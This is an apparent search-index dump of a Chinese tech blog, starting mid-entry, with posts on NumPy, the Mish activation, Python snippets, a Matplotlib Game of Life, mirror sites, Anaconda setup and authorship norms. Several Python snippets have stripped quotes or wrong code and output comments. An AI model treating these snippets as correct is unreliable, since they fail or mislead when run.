[0,1,2]]print(np.unique(a)) array([0, 1, 2, 3, 4, 5])#查看a中的唯一行（也就是没有重复的行）print(np.unique(a,axis = 0)) array([[0, 1, 2], [3, 4, 5]])#查看a中的唯一列print(np.unique(a,axis = 1)) array([[0, 1, 2], [3, 4, 5], [0, 1, 2]])#查看a中第一行的唯一值print(np.unique(a[0])) array([0, 1, 2]) 通过布尔运算筛选 这里在中括号中添加筛选条件，当该条件的结果为True时（即满足条件时），返回该值。 1X[X &gt; 10] #筛选数组X中大于10的数据 这里需要注意的是，当输入多个筛选条件时，&amp;表示与，|表示或，~表示非。 运算与排序ndarray运算 集合运算 123np.intersect1d(x,y) #取x与y的交集np.setdiff1d(x,y) #取x与y的差集，返回的是在x中且没在y中的元素np.union1d(x,y) #取x与y的并集 算术运算我们可以通过+、-、*、/或np.add、np.substract、np.multiply 、np.divide来对两个矩阵进行元素级的加减乘除运算，因为是元素级的运算，所以两个矩阵的shape必须要一致或者是可广播(Broadcast)。 这里所谓的可广播，就是指虽然A和B两个矩阵的shape不一致，但是A可以拆分为整数个与B具有相同shape的矩阵，这样在进行元素级别的运算时，就会先将A进行拆分，然后与B进行运算，结果再组合一起就可以。这里的A就是“可广播”矩阵。 上面涉及到的乘法是元素对应相乘，也就是点乘，那矩阵的叉乘呢？可以了解下numpy.matmul函数。 ndarray排序我们使用np.sort()和ndarray.sort()来对ndarray进行排序。 相同的是： 二者都可以使用参数axis来决定依照哪个轴进行排序，axis = 0时按照列排序，axis = 1时按照行排序； 不同的是： np.sort()不会更改原数组；ndarray.sort()会更改原数组。","link":"/2019/09/28/初识Numpy/"},{"title":"南大周志华关于论文内容演讲演示文稿","text":"可以允许不完美，但不能不做~ Oneindex下载：http://pan.sqdxwz.com/?/文档/ 蓝奏云下载：https://www.lanzous.com/i6ecpmj 网盘(提取码：21yg )备用下载：https://pan.baidu.com/s/1xXDe3QdrnoiAYojYLl2OuA","link":"/2019/09/25/南大周志华关于论文内容演讲演示文稿/"},{"title":"Mish:撼动深度学习ReLU激活函数的新继任者","text":"对激活函数的研究一直没有停止过，ReLU还是统治着深度学习的激活函数，不过，这种情况有可能会被Mish改变。 Diganta Misra的一篇题为“Mish: A Self Regularized Non-Monotonic Neural Activation Function”的新论文介绍了一个新的深度学习激活函数，该函数在最终准确度上比Swish(+.494%)和ReLU(+ 1.671%)都有提高。 他们的小型FastAI团队使用Mish代替ReLU，打破了之前在FastAI全球排行榜上准确性得分记录的一部分。结合Ranger优化器，Mish激活，Flat + Cosine 退火和自注意力层，他们能够获得12个新的排行榜记录！ 我们12项排行榜记录中的6项。每条记录都是用Mish而不是ReLU。(蓝色高亮显示，400 epoch的准确率为94.6，略高于我们的20 epoch的准确率为93.8:) 作为他们自己测试的一部分，对于ImageWoof数据集的5 epoch测试，他们说： Mish在高显著性水平上优于ReLU (P &lt; 0.0001)。(FastAI论坛@ Seb) Mish已经在70多个基准上进行了测试，包括图像分类、分割和生成，并与其他15个激活函数进行了比较。 什么是Mesh直接看Mesh的代码会更简单一点，简单总结一下，Mish=x * tanh(ln(1+e^x))。 其他的激活函数，ReLU是x = max(0,x)，Swish是x * sigmoid(x)。 PyTorch的Mish实现： Tensorflow中的Mish函数： Tensorflow：x = x *tf.math.tanh(F.softplus(x)) Mish和其他的激活函数相比怎么样？下图显示了Mish与其他一些激活函数的测试结果。这是多达73个测试的结果，在不同的架构，不同的任务上： 为什么Mish表现这么好？以上无边界(即正值可以达到任何高度)避免了由于封顶而导致的饱和。理论上对负值的轻微允许允许更好的梯度流，而不是像ReLU中那样的硬零边界。 最后，可能也是最重要的，目前的想法是，平滑的激活函数允许更好的信息深入神经网络，从而得到更好的准确性和泛化。 尽管如此，我测试了许多激活函数，它们也满足了其中的许多想法，但大多数都无法执行。这里的主要区别可能是Mish函数在曲线上几乎所有点上的平滑度。 这种通过Mish激活曲线平滑性来推送信息的能力如下图所示，在本文的一个简单测试中，越来越多的层被添加到一个测试神经网络中，而没有一个统一的函数。随着层深的增加，ReLU精度迅速下降，其次是Swish。相比之下，Mish能更好地保持准确性，这可能是因为它能更好地传播信息： 更平滑的激活功能允许信息更深入地流动……注意，随着层数的增加，ReLU快速下降。 如何把Mish放到你自己的网络中？Mish的PyTorch和FastAI的源代码可以在github的两个地方找到： 1、官方Mish github：https://github.com/digantamisra98/Mish 2、非官方的Mish使用inline提升速度：https://github.com/lessw2020/mish 总结ReLU有一些已知的弱点，但是通常它执行起来很轻，并且在计算上很轻。Mish具有较强的理论渊源，在测试中，就训练稳定性和准确性而言，Mish的平均性能优于ReLU。 复杂度只稍微增加了一点(V100 GPU和Mish，相对于ReLU，每epoch增加大约1秒)，考虑到训练稳定性的提高和最终精度的提高，稍微增加一点时间似乎是值得的。 最终，在今年测试了大量新的激活函数后，Mish在这方面处于领先地位，许多人怀疑它很有可能成为AI未来的新ReLU。 英文文章地址：https://medium.com/@lessw/meet-mish-new-state-of-the-art-ai-activation-function-the-successor-to-relu-846a6d93471f","link":"/2019/09/25/Mish-撼动深度学习ReLU激活函数的新继任者/"},{"title":"算法可视化平台","text":"前言无疑，数据结构与算法学习最大的难点之一就是如何在脑中形象化其抽象的逻辑步骤。而图像在很多时候能够大大帮助我们理解其对应的抽象化的东西，而如果这个图像还是我们自己一点点画出来的，那么无疑这个印象是最深刻的了。没错，今天就是算法可视化的网站。 网站 https://www.cs.usfca.edu/~galles/visualization/Algorithms.html 该网站特点: 算法可视化 界面简洁直观 过程可控制 https://visualgo.net/zh/ 该网站特点： 算法可视化 文字讲解 复杂度备注 图形可操控调整 https://algorithm-visualizer.org/ 该网站特点： 算法可视化 有代码 有控制台输出帮助理解 算法种类丰富","link":"/2019/09/25/算法可视化平台/"},{"title":"即学即用的30个python常用代码","text":"1.检查重复元素下面的方法可以检查给定列表中是否有重复的元素。它使用了 set() 属性，该属性将会从列表中删除重复的元素。 1234567def all_unique(lst): return len(lst) == len(set(lst)) x = [1,1,2,2,3,2,3,4,5,6] y = [1,2,3,4,5] all_unique(x) # False all_unique(y) # True 2.变位词检测两个字符串是否互为变位词（即互相颠倒字符顺序） 12345from collections import Counter def anagram(first, second): return Counter(first) == Counter(second) anagram(\"abcd3\", \"3acdb\") # True 3.检查内存使用情况123import sys variable = 30 print(sys.getsizeof(variable)) # 24 4.字节大小计算以下方法将以字节为单位返回字符串长度。 12345def byte_size(string): return(len(string.encode( utf-8 ))) byte_size( 😀 ) # 4 byte_size( Hello World ) # 11 5.重复打印字符n次123n = 2; s =\"Programming\"; print(s * n); # ProgrammingProgramming 6.首字母大写12s = \"programming is awesome\" print(s.title()) # Programming Is Awesome 7.分块1234567from math import ceil def chunk(lst, size): return list( map(lambda x: lst[x * size:x * size + size], list(range(0, ceil(len(lst) / size))))) chunk([1,2,3,4,5],2) # [[1,2],[3,4],5] 8.压缩以下方法使用 fliter() 删除列表中的错误值（如：False, None, 0 和“”） 123def compact(lst): return list(filter(bool, lst)) compact([0, 1, False, 2, , 3, a , s , 34]) # [ 1, 2, 3, a , s , 34 ] 9.间隔数以下代码段可以用来转换一个二维数组。 123array = [[ a , b ], [ c , d ], [ e , f ]] transposed = zip(*array) print(transposed) # [( a , c , e ), ( b , d , f )] 10.链式比较以下代码可以在一行中用各种操作符进行多次比较。 123a = 3 print( 2 &lt; a &lt; 8) # True print(1 == a &lt; 2) # False 11.逗号分隔12hobbies = [\"basketball\", \"football\", \"swimming\"]print(\"My hobbies are: \" + \", \".join(hobbies)) # My hobbies are: basketball, football, swimming 12.计算元音字母数12345import re def count_vowels(str): return len(len(re.findall(r [aeiou] , str, re.IGNORECASE))) count_vowels( foobar ) # 3 count_vowels( gym ) # 0 13.首字母恢复小写1234def decapitalize(string): return str[:1].lower() + str[1:] decapitalize( FooBar ) # fooBar decapitalize( FooBar ) # fooBar 14.平面化以下方法使用递归来展开潜在的深度列表。 1234567891011121314def spread(arg): ret = [] for i in arg: if isinstance(i, list): ret.extend(i) else: ret.append(i) return retdef deep_flatten(lst): result = [] result.extend( spread(list(map(lambda x: deep_flatten(x) if type(x) == list else x, lst)))) return resultdeep_flatten([1, [2], [[3], 4], 5]) # [1,2,3,4,5] 15.差异123456def difference(a, b): set_a = set(a) set_b = set(b) comparison = set_a.difference(set_b) return list(comparison)difference([1,2,3], [1,2,4]) # [3] 16.寻找差异123456def difference_by(a, b, fn): b = set(map(fn, b)) return [item for item in a if fn(item) not in b]from math import floordifference_by([2.1, 1.2], [2.3, 3.4],floor) # [1.2]difference_by([{ x : 2 }, { x : 1 }], [{ x : 1 }], lambda v : v[ x ]) # [ { x: 2 } ] 17.链式函数调用123456def add(a, b): return a + bdef subtract(a, b): return a - ba, b = 4, 5print((subtract if a &gt; b else add)(a, b)) # 9 18.检查重复元素1234567def has_duplicates(lst): return len(lst) != len(set(lst)) x = [1,2,3,4,5,5]y = [1,2,3,4,5]has_duplicates(x) # Truehas_duplicates(y) # False 19.合并两个字典1234567def merge_two_dicts(a, b): c = a.copy() # make a copy of a c.update(b) # modify keys and values of a with the ones from b return ca = { x : 1, y : 2}b = { y : 3, z : 4}print(merge_two_dicts(a, b)) # { y : 3, x : 1, z : 4} 123456#在python3.5版本后你还可以：def merge_dictionaries(a, b) return {**a, **b}a = { x : 1, y : 2}b = { y : 3, z : 4}print(merge_dictionaries(a, b)) # { y : 3, x : 1, z : 4} 20.将两个列表转化成一个字典123456def to_dictionary(keys, values): return dict(zip(keys, values)) keys = [\"a\", \"b\", \"c\"] values = [2, 3, 4]print(to_dictionary(keys, values)) # { a : 2, c : 4, b : 3} 21.使用枚举1以下方法将字典作为输入，然后仅返回该字典中的键。 1234567list = [\"a\", \"b\", \"c\", \"d\"]for index, element in enumerate(list): print(\"Value\", element, \"Index \", index, )# ( Value , a , Index , 0)# ( Value , b , Index , 1)#( Value , c , Index , 2)# ( Value , d , Index , 3) 22.计算需要的时间12345678910import timestart_time = time.time()a = 1b = 2c = a + bprint(c) #3end_time = time.time()total_time = end_time - start_timeprint(\"Time: \", total_time)# ( Time: , 1.1205673217773438e-05) 23.Try else指令你可以将 else 子句作为 try/except 块的一部分，如果没有抛出异常，则执行该子句。 1234567try: 2*3except TypeError: print(\"An exception was raised\")else: print(\"Thank God, no exceptions were raised.\")#Thank God, no exceptions were raised. 24.查找最常见元素以下方法返回列表中出现的最常见元素。 12345def most_frequent(list): return max(set(list), key = list.count) list = [1,2,1,2,3,2,1,4,2]most_frequent(list) 25.回文以下方法可检查给定的字符串是否为回文结构。该方法首先将字符串转换为小写，然后从中删除非字母数字字符。最后，它会将新的字符串与反转版本进行比较。 12345def palindrome(string): from re import sub s = sub( [W_] , , string.lower()) return s == s[::-1]palindrome( taco cat ) # True 26.没有 if-else 语句的简单计算器123456789import operatoraction = { \"+\": operator.add, \"-\": operator.sub, \"/\": operator.truediv, \"*\": operator.mul, \"**\": pow}print(action[ - ](50, 25)) # 25 27.元素顺序打乱12345678910111213from copy import deepcopyfrom random import randintdef shuffle(lst): temp_lst = deepcopy(lst) m = len(temp_lst) while (m): m -= 1 i = randint(0, m) temp_lst[m], temp_lst[i] = temp_lst[i], temp_lst[m] return temp_lst foo = [1,2,3]shuffle(foo) # [2,3,1] , foo = [1,2,3] 28.列表扁平化123456789def spread(arg): ret = [] for i in arg: if isinstance(i, list): ret.extend(i) else: ret.append(i) return retspread([1,2,3,[4,5,6],[7],8,9]) # [1,2,3,4,5,6,7,8,9] 29.变量变换1234def swap(a, b): return b, aa, b = -1, 14swap(a, b) # (14, -1) 30.获取确实键的默认值12d = { a : 1, b : 2}print(d.get( c , 3)) # 3","link":"/2019/09/24/即学即用的30个python常用代码/"},{"title":"The Game of Life","text":"#引言 Python 的 Matplotlib 是最常用的图表绘制以及数据可视化库。我们对折线图、柱状图以及热力图都比较熟悉，但你知道用 Matplotlib 还能做简单的动画吗？ 下面就是用 Matplotlib 制作动画的例子。展示的是 John Conway 的 《The Game of Life》，这是一个 Metis（数据科学夏令营）中的编程挑战题目，同时给了我一个机会让我知道Matpltlib可以制作动图。看看结果的动图： 这篇文章的重点还是主要放在 python 中如何用 Matploylib 制作动画。 但如果你不太熟悉模拟游戏的话（它更像是可以看的模拟动画，而非可以玩的游戏），我来给大家介绍一下规则： 一开始先设置一个 N×N 的网格（我的动画中用的是 50×50 ）； 接着随机地向格子中填充“小细胞”（一开始随机地从 2500 个格子中选取 1500 个进行填充）； 如果邻居小细胞少于等于 1 个，那格子中的小细胞会死掉； 如果邻居大于等于 4 个的也会死掉； 只有 2 个或 3 个邻居时可以生存； 空的格子中如果正好有 3 个邻居，则会长出 1 个新的“小细胞”； 通过对规则的阅读我最先想到的是：生命游戏 代码实现注意:我运行采用的是Anaconda3集成环境；程序运行两次，第一次营造运行环境，第二次运行程序输出。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108import timefrom IPython import displayimport matplotlib.pyplot as pltimport matplotlib.animation as animationimport numpy as npimport seaborn as snsimport random# Some helper functions# Initialize the board with starting positionsdef init_board(pos_list, my_board): for pos in pos_list: my_board[pos[0], pos[1]] = 1 return my_board# Make sure padded border values are always zerodef force_pad_zero(my_board): edge_row_0 = 0 edge_row_1 = my_board.shape[0] - 1 edge_col_0 = 0 edge_col_1 = my_board.shape[1] - 1 for index, row in enumerate(my_board): if index == 0: row[:] = 0 elif index == edge_row_1: row[:] = 0 else: row[edge_col_0] = 0 row[edge_col_1] = 0 for col in my_board: col[edge_row_0] = 0 col[edge_row_1] = 0 return my_board# Figure out the number of neighbors for a given celldef calc_neighbors(row, col, my_board): b = force_pad_zero(my_board) num_neighbors = (b[row-1,col-1] + b[row+0,col-1] + b[row+1,col-1] + b[row+1,col+0] + b[row+1,col+1] + b[row+0,col+1] + b[row-1,col+1] + b[row-1,col+0]) return num_neighbors# Update the board based on the game rules, each call to update_board is one turndef update_board(my_board): old_board = my_board.copy() set_zero = [] set_one = [] # Loop through board and update according to rules for i, row in enumerate(my_board[1:-1,1:-1]): for j, col in enumerate(row): true_i = i + 1 true_j = j + 1 # Update based on number of neighbors (using calc_neighbors) # set_zero and set_one are lists that tell me the coordinates of cells that require updating if (((calc_neighbors(true_i, true_j, my_board) &lt;= 1) or (calc_neighbors(true_i, true_j, my_board) &gt;= 4)) and my_board[true_i, true_j] != 0): set_zero.append([true_i, true_j]) elif ((calc_neighbors(true_i, true_j, my_board) == 3) and my_board[true_i, true_j] == 0): set_one.append([true_i, true_j]) # Update the required cells for index, val in enumerate(set_zero): my_board[val[0], val[1]] = 0 for index, val in enumerate(set_one): my_board[val[0], val[1]] = 1 return my_board# Input variables for the boardboardsize = 50 # board will be X by X where X = boardsizepad = 2 # padded border, do not change this!initial_cells = 1500 # this number of initial cells will be placed # in randomly generated positions# Get a list of random coordinates so that we can initialize # board with randomly placed organismspos_list = []for i in range(initial_cells): pos_list.append([random.randint(1, boardsize), random.randint(1, boardsize)])# Initialize the boardmy_board = np.zeros((boardsize+pad, boardsize+pad))my_board = init_board(pos_list, my_board)##### Animate the board ###### This will throw an error the first time you run the code, but the program will run properly if you# execute the cell again (there is an error with the animation package that I cannot seem to get rid of)# Required line for plotting the animation%matplotlib notebook# Initialize the plot of the board that will be used for animationfig = plt.gcf()# Show first image - which is the initial boardim = plt.imshow(my_board)plt.show()plt.savefig(fname='game_of_life', dpi=150)# Helper function that updates the board and returns a new image of# the updated board animate is the function that FuncAnimation callsdef animate(frame): im.set_data(update_board(my_board)) return im,# This line creates the animationanim = animation.FuncAnimation(fig, animate, frames=200, interval=50) 总结希望这篇文章能帮到大家。在结束之前，让我来帮助大家脑补更多我们今天学到的动画功能在数据科学上的应用： 一个个地画出蒙特卡洛模拟数据，你能观察到最终的分布是如何逐步形成的； 按顺序遍历时间序列数据，可以描绘你的模型或数据在新的观察角度下有什么表现； 当你改变输入参数时，比如族群数，可以展现你的算法是如何划分族群的； 根据时间或不同的数据子集生成关联热力图，用于观察不同的样本是如何影响你的模型的预期参数的。","link":"/2019/09/18/The-Game-of-Life/"},{"title":"镜像站","text":"网易镜像：http://mirrors.163.com/ 阿里云镜像：http://mirrors.aliyun.com/ 中国科学技术大学镜像：http://mirrors.ustc.edu.cn/ 厦门大学镜像：http://mirrors.xmu.edu.cn/ 搜狐镜像：http://mirrors.sohu.com/ 北京交通大学镜像：http://mirror.bjtu.edu.cn/ 北京理工大学镜像：http://mirror.bit.edu.cn/web/ 兰州大学镜像：http://mirror.lzu.edu.cn/ 上海交通大学镜像：http://ftp.sjtu.edu.cn/ 清华大学镜像：https://mirrors.tuna.tsinghua.edu.cn/ 东北大学镜像：http://mirror.neu.edu.cn/ 浙江大学镜像：http://mirrors.zju.edu.cn/ 东软信息学院：http://mirrors.neusoft.edu.cn/ 重庆大学镜像：http://mirrors.cqu.edu.cn/ 大连理工大学镜像：http://mirror.dlut.edu.cn/ CN99镜像：http://mirrors.cn99.com/","link":"/2019/09/18/镜像站/"},{"title":"AI领域区分介绍","text":"说到人工智能(AI)的定义，映入脑海的关键词可能是“未来”，“科幻小说”，虽然这些因素看似离我们很遥远，但它却是我们日常生活的一部分。语音助手的普及、无人驾驶的成功，人工智能、机器学习、深度学习已经深入我们生活的各个场景。例如京东会根据你的浏览行为和用户的相似性，利用算法为你推荐你需要的产品；又比如美颜相机，会基于你面部特征的分析，通过算法精细你的美颜效果。还有众所周知的谷歌DeepMind，当AlphaGo打败了韩国职业围棋高手Lee Se-dol时，媒体描述这场人机对战的时候，提到了人工智能AI、机器学习、深度学习等术语。没错，这三项技术都为AlphaGo的胜利立下了汗马功劳，然而它们并不是一回事。 人工智能和机器学习的同时出现，机器学习和深度学习的交替使用……使大部分读者雾里看花，这些概念究竟有何区别，我们可以通过下面一个关系图来进行区分。 图一：人工智能、机器学习、深度学习的关系 人工智能包括了机器学习和深度学习，机器学习包括了深度学习。人工智能是机器学习的父类，机器学习则是深度学习的父类。 人工智能（Artificial Intelligence，AI）是计算机科学的一个分支，它企图了解智能的实质，并生产出一种新的与人类智能相似的方式作出反应的智能机器，它不是人的智能，但能像人那样思考、也可能超过人的智能。 人工智能实际应用：机器视觉，指纹识别，人脸识别，视网膜识别，虹膜识别，掌纹识别，专家系统，自动规划，智能搜索，定理证明，博弈，自动程序设计，智能控制，机器人学，语言和图像理解，遗传编程等。人工智能目前也分为：强人工智能(BOTTOM-UPAI)和弱人工智能(TOP-DOWNAI)。 机器学习（Machine Learning，ML）是人工智能的核心，属于人工智能的一个分支。机器学习是指从数据中自动分析获得规律，并利用规律对未知数据进行预测的算法，所以机器学习的核心是数据、算法（模型）、算力（计算机运算能力）。 机器学习应用领域：数据挖掘、数据分类、计算机视觉、自然语言处理(NLP)、生物特征识别、搜索引擎、医学诊断、检测信用卡欺诈、证券市场分析、DNA序列测序、语音和手写识别、战略游戏和机器人运用等。 深度学习（Deep Learning，DL）：是机器学习研究中的一个新的领域，其动机在于建立、模拟人脑进行分析学习的神经网络，它模仿人脑的机制来解释数据。 数据挖掘（Data Mining，DM），顾名思义是指利用机器学习技术从海量数据中“挖掘”隐藏信息，主要应用于图像、声音、文本。在商业环境中，企业希望让存放在数据库中的数据能“说话”，支持决策。所以数据挖掘更偏向于应用。 图二：数据挖掘与机器学习的关系 机器学习是数据挖掘的一种重要方法，但机器学习是另一门学科，并不从属于数据挖掘，二者相辅相成。数据挖掘是机器学习和数据库的交叉，主要利用机器学习提供的技术来分析海量数据，利用数据库界提供的技术来管理海量数据。 不管是人工智能、机器学习、深度学习还是数据挖掘，目前都在解决共同目标时发挥了自己的优势，并为社会生产和人类生活提供便利，帮助我们探索过去、展示现状、预测未来。","link":"/2019/09/15/AI领域区分介绍/"},{"title":"为Anaconda3安装tensorflow等","text":"Anaconda3介绍简单来说，Anaconda是Python的包管理器和环境管理器。 先来解决一个初学者都会问的问题：我已经安装了Python，那么为什么还需要Anaconda呢？原因有以下几点： Anaconda附带了一大批常用数据科学包，它附带了conda、Python和 150 多个科学包及其依赖项。因此你可以用Anaconda立即开始处理数据。 管理包。Anaconda 是在 conda（一个包管理器和环境管理器）上发展出来的。在数据分析中，你会用到很多第三方的包，而conda（包管理器）可以很好的帮助你在计算机上安装和管理这些包，包括安装、卸载和更新包。 管理环境。为什么需要管理环境呢？比如你在A项目中用到了Python2，而新的项目要求使用Python3，而同时安装两个Python版本可能会造成许多混乱和错误。这时候conda就可以帮助你为不同的项目建立不同的运行环境。还有很多项目使用的包版本不同，比如不同的pandas版本，不可能同时安装两个pandas版本。你要做的应该是在项目对应的环境中创建对应的pandas版本。这时候conda就可以帮你做到。 Anaconda3的安装 官网地址 清华镜像 关于安装过程中的细节,如全局变量设置…可自行百度,下面我们转入正题 Anaconda3安装tensorflow 打开anaconda安装时自带的Anaconda prompt 打开后,输入清华镜像的tensorflow的下载地址(如果你已经在墙外翱翔了,可以省略这一步): 12conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --set show_channel_urls yes 接着我们开始创建一个python3.6的环境,因为如果你安装的是最新的anaconda,它默认环境为py3.7,并且在不久之前,tensorflow已经开始支持py3.6,所以我们创建一个py3.6环境:1conda create -n tensorflow python=3.6 启动anaconda中的py3.6环境:1activate tensorflow 如果不能进入,则重新执行第3步骤 进入py3.6的环境中后,我们就可以进行安装了(此处我们安装的是CPU版本的tensorflow):1pip install --upgrade --ignore-installed tensorflow 当我们不使用tensorflow时,我们就可以使用:1deactivate 退出该环境 开始测试一下是否安装成功: 重新打开Anaconda Prompt—&gt;activate tensorflow—&gt;python来启动tensorflow，并进入python环境 12345#TensorFlow使用图(Graph)来表示计算任务；并使用会话(Session)来执行图，通过Session.close()来关闭会话（这是一种显式关闭会话的方式）。会话方式有显式和隐式会话之分。import tensorflow as tfhello = tf.constant('Hello, TensorFlow!') #初始化一个TensorFlow的常量sess = tf.Session() #启动一个会话print(sess.run(hello)) 如果可以准确的输出结果,那么恭喜你,安装tensorflow成功! Anaconda3安装pytorch 打开anaconda安装时自带的Anaconda prompt 创建py3.6环境: 1conda create -n pytorch python=3.6 启动anaconda中的py3.6环境:1activate pytorch PyTorch 的官网提供了简单的安装方法，只需简单的命令即可。 首先，打开 PyTorch 官网安装页面（需自备梯子）：https://pytorch.org/get-started/locally/ 然后复制页面中Run this Command后的代码,粘贴在你的命令行,等待安装完成就可以了~ Anaconda3安装keras其实keras是可以与tensorflow在共同环境下使用的,所以我们可以直接将keras安装在我们的tensorflow环境中。 打开anaconda安装时自带的Anaconda prompt 创建py3.6环境: 1conda create -n tensorflow python=3.6 启动anaconda中的py3.6环境:1activate tensorflow 直接运行命令:123conda install keras或者pip install keras 等待安装完成即可~","link":"/2019/09/15/为Anaconda3安装tensorflow等/"},{"title":"关于论文作者那点事","text":"对于论文想必大家可能都有过耳闻,今天做一下一些相关知识的普及~ 首先,第一作者和通讯作者之间一直是缠缠绵绵到天涯的关系，很多人对这两者并不陌生，但是在一些细节上的问题又感觉比较绕，我今天特意收集了平时大家提到的关于两者之间的一些问题，做成问答集锦，你想知道的，都在里面啦~ 什么是第一作者？第一作者通常主导大部分的实验工作，在一般的情况下，引用一篇论文时，提到的就是第一作者的名字，如 Tomas et al. report that…。 以第一作者的身份进行论文发表对博士生的科研路是很重要的，不止中国，全球大部分的博士毕业标准都要求学生要作为第一作者发表至少一篇论文。 对博士后及资深教授来说，作为第一作者的期刊论文发表是争取基金、职称晋升及续聘时的重要因素。据此，期刊论文的作者名单里，第一个名字一直是最抢手的位置。 在第一作者之后，作者顺序是根据对研究的贡献度排序，贡献度越高的排名越前。不过，有时候可能会有多位作者贡献度相同，这时候就可以列为共同一作、共同二作… 注意:第一作者很重要很重要很重要，要毕业、评职称、争基金…没头发可以，没它不行~ 什么是通讯作者？通讯作者是课题的总负责人，承担课题的经费、设计、文章的书写和把关，在投稿、同行评审和整个发表流程中负责和期刊沟通。从知识产权的角度来说，研究成果算是通讯作者的。能当通讯作者的人一般有以下几类： 论文的法定负责人: 通讯作者也是论文的主要受益人之一。也可以这么说，论文的第一作者是这项科研成果的主要贡献者，而论文的通讯作者是这项成果的责任者和受益人。 导师、教授、科研项目的主要负责人 其主要贡献是提供研究指导、研究经费、试验场所、实验室、仪器设备等与实验相关的物质资源。 论文的任何作者 要是一篇论文有数个作者，通讯作者可以是他们中的任何一位。至于到底是谁，主要看通讯作者在这项研究中真正起的作用和做出的贡献。要是他在整个实验中做到了关键的作用，那么他就理所当然地即可做第一作者，也可做通讯作者。 注意: 对于学生来说，通讯作者一般是他的导师。 对于研究机构来说，通讯作者一般是项目负责人。 对于出版机构来说，通讯作者可以是机构老板。 另外！！！一定要有固定的通讯地址！ 第一作者和通讯作者，谁更重要？通讯作者未必是第一作者，但第一作者可以是通讯作者。通讯作者多数情况和第一作者是同一个人，只有在通讯作者和第一作者不一致的时候，才有必要在文章脚注中附加通讯作者的标识。 所以，总的来说都重要！对于作者来说，第一作者很重要，谁是通讯作者没关系，但是通讯单位很关键，很多单位评职称看通讯单位，不看通讯作者。对于导师来说，通讯作者重要，因为导师永远当通讯作者，至于谁是第一作者不重要。对于出版机构来说，通讯作者非常重要，因为机构老板也常是通讯作者… 注意:通讯作者不是随便挂的，一旦出现通讯作者，这篇文章的科研版权就要非常注意了~ 共同一作排序重要吗，会影响评职称吗？共同作者排在第一位的是最好，所有东西都可以申请。因为排第一的肯定是第一作者，大家引用的时候都会缩写成“First-Author, et al，但是排在第二位就要小心了，排在第二位的虽然也是共同第一作者，但是有些单位只看第一位的，所以评职称的时候一定要问清楚单位科研处排在第二的共同作者能否评职称。 不过事无绝对，以下一些例子里面的共同一作和第一作者的贡献量和含金量差不多，排序嘛，就比较随便了··· 按作者名字的字母顺序决定作者排序 抛硬币决定作者顺序 根据对星战的痴迷程度决定作者顺序 根据申tenure的时间远近决定作者顺序 注意:国内对作者排序还是很重视的，很多机构和单位甚至只认可排序靠前的，所以能排前面就别排后面啦~ 所有的论文都要有通讯作者吗？并不是要求所有的论文都一定要写通讯作者。对于没有通讯作者的稿件，默认第一作者为通讯作者。 通讯作者多数情况和第一作者是同一个人，这样的话实际上是省略了通讯作者。只有在通讯作者和第一作者不一致的时候，才有必要加通讯作者。不赞成一味地模仿国外杂志，加不加通讯作者应根据需要而定。 注意:通讯作者非必须，随意模仿不可取~ 我有两个老板，一个小老板，一个大老板，通讯作者排序要怎么排呢？目前，最常见的做法是权力最大的排最后，权力排倒数第二，也就是大老板排最后，小老板排倒数第二。一般期刊只能允许两位通讯作者，在文章中标注，列出他们的邮箱，偶尔也会看见有些期刊会有三个通讯，不过也有些期刊不准共同通讯，只能一个人。所以在投稿前一定要仔细阅读稿约。 注意:根据权力大小排就对了！ 导师可以既是第一作者，又是通讯作者吗？可以。第一作者兼任通讯作者没什么问题，更何况，对单一作者的论文来说，第一作者和通讯作者肯定是同一个人。如果你的教授对研究也出谋划策，拟出初始计划和研究设计，一定要将他列为共同作者。至于具体怎么做，还是需要跟导师商量，达成一致，避免日后产生争议。 注意:导师可以既当第一作者，又当通讯作者。 论文被接受，还能更换作者顺序和通讯作者吗？一般来说，期刊对于作者顺序变更不会有太大的意见，但非必要最好避免更换通讯作者，因为期刊编辑和通讯作者之间已经有过交流，有一定的熟悉程度。 不过，如果有不可抗拒的因素需要换通讯作者跟作者顺序的话，一定要跟编辑沟通解释清楚，因为这会涉及到之后的一系列问题，例如评职称、申奖金等等。另外，修改作者的时候，一定要附上新的版权~ 注意:作者顺序可以改，通讯作者最好不要改！ 不是通讯作者可以直接和期刊编辑联系吗？通讯作者的作用就是期刊编辑最主要的联系窗口，相关的沟通事宜都是通讯作者负责，不是通讯作者最好不要和期刊编辑联系，为避免将事情复杂化，最好是将事情积极反馈给通讯作者，再由通讯作者和期刊编辑沟通。 注意:让通讯作者架起沟通的桥梁~ 论文被查出学术不端，负责的应该是第一作者还是通讯作者？通讯作者是要对论文的全程进行把关的。特别是对里面内容的真实性，论证的根据等，有没有达到发表的水平。所以，通讯作者，既是一个署名权，更重要的是对这篇学术论文承担的责任。如果这篇文章出问题，通讯作者是第一责任人！当然那些没有被告知，就被别人列为论文的通讯作者，还是会有背黑锅的时候··· 注意:通讯作者负责就要负到底！ 让有名望的学者当通讯作者是不是能增加论文的投中率？如果在学术界口碑好、有名望教授当自己论文的通讯作者，会增加论文的投中率。因为通讯作者需要对论文把关，好口碑的教授一般学风严谨，出任通讯作者也是以自己的名誉来做担保，所以编辑在审查的时候，也会增加对论文的好感度，最后能不能投中关键的还是看论文的质量。 注意:论文能不能投中关键还是靠质量~ 最后,提醒一下大家：研究项目启动前是决定署名作者及其排名顺序的最佳时机，参与项目的团队成员必须在这些方面达成完全一致，毕竟按劳所得是亘古不变的真理~","link":"/2019/09/15/关于论文作者那点事/"},{"title":"机器学习分类算法","text":"说起分类算法，相信学过机器学习的同学都能侃上一二。 可是，你能够如数家珍地说出所有常用的分类算法，以及他们的特征、优缺点吗？比如说，你可以快速地回答下面的问题么: KNN算法的优缺点是什么？ Naive Bayes算法的基本假设是什么？ entropy loss是如何定义的？ 最后，分类算法调参常用的图像又有哪些？ 可能真的涉及这些问题时候，我们不能快速的回答，所以我总结了此文~ 机器学习是一种能从数据中学习的计算机编程科学以及艺术，就像下面这句话说得一样。 机器学习是使计算机无需显式编程就能学习的研究领域。——阿瑟·塞缪尔，1959年 不过还有一个更好的定义： “如果一个程序在使用既有的经验（E）执行某类任务（T）的过程中被认为是“具备学习能力的”，那么它一定需要展现出:利用现有的经验（E），不断改善其完成既定任务（T）的性能（P）的特性。” ——Tom Mitchell, 1997 